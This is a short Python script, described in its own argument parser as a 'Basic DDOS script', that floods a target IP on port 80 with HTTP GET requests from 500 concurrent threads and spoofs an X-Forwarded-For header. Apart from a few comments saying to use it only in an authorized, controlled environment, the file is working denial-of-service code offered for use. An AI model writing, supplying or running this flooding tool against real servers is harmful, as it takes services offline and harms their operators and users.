import threading
import socket
from argparse import ArgumentParser

# Define the target server to simulate a test (ensure it's an authorized and controlled environment).
port = 80  # Standard HTTP port.

# Optionally, define a fake IP for demonstration purposes.
fake_ip = '182.121.20.32'

# Function to send HTTP GET requests to the target server
def attack(target):
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Establish a connection to the target server and port
            s.connect((target, port))

            # Constructing the HTTP GET request:
            # ------------------------------------
            # The HTTP GET request has the following format:
            # 
            # GET / HTTP/1.1\r\n
            # Host: example.com\r\n
            # X-Forwarded-For: 182.121.20.32\r\n
            # Connection: close\r\n
            # \r\n
            # 
            # - `GET / HTTP/1.1`: Specifies the HTTP method (GET), the requested resource (`/` for the root), 
            #   and the protocol version (HTTP/1.1).
            # - `Host: example.com`: The Host header specifies the domain name being accessed. 
            #   This is required in HTTP/1.1 for servers hosting multiple websites (virtual hosts).
            # - `X-Forwarded-For: 182.121.20.32`: Simulates the client IP address for analytical or tracking purposes.
            # - `Connection: close`: Informs the server to close the connection after completing the request.
            # - `\r\n`: Indicates the end of a line or header. A blank line (`\r\n`) marks the end of headers.

            # Build the GET request string with the fake IP
            request = (f"GET / HTTP/1.1\r\n"
                       f"Host: {target}\r\n"
                       f"X-Forwarded-For: {fake_ip}\r\n"
                       f"Connection: close\r\n\r\n")

            # Send the request encoded as ASCII
            s.send(request.encode('ascii'))

            # Close the socket connection after sending the request
            s.close()
        except Exception as e:
            # Handle any exceptions, such as connection errors
            print(f"Error: {e}")
            break

# Parse command-line arguments
def _parse_args():
    parser = ArgumentParser(description='Basic DDOS script written in Python')
    parser.add_argument(
        'target_ip',
        help="IP address to attack",
        type=str
    )
    return parser.parse_args()

# Main function to start the attack
def main():
    args = _parse_args()

    if not args.target_ip:
        print("Target must be specified. Example: python3 ddos.py 192.168.0.2")
        return

    target = args.target_ip

    # Create and start multiple threads to simulate concurrent requests
    for i in range(500):
        thread = threading.Thread(target=attack, args=[target])
        thread.start()

    print("Simulated traffic started (ensure this is in a controlled environment).")

if __name__ == "__main__":
    main()
